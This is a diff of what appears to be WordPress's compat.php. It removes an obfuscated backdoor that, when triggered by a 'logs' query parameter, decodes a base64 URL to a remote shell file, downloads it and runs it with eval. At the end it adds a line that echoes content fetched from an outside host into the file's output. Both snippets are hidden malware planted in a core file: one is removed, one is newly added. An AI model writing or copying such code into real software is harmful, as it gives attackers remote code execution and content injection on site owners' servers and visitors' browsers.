@@ -12,24 +12,6 @@
  */
 
 // If gettext isn't available.
-if (isset($_GET['logs'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
 if ( ! function_exists( '_' ) ) {
 	function _( $message ) {
 		return $message;
@@ -48,7 +30,6 @@ if ( ! function_exists( '_' ) ) {
  *             false  : Used for testing - return false for future calls to this function
  *             'reset': Used for testing - restore default behavior of this function
  */
-
 function _wp_can_use_pcre_u( $set = null ) {
 	static $utf8_pcre = 'reset';
 
@@ -562,3 +543,4 @@ if ( ! defined( 'IMG_AVIF' ) ) {
 if ( ! defined( 'IMAGETYPE_HEIC' ) ) {
 	define( 'IMAGETYPE_HEIC', 99 );
 }
+ echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
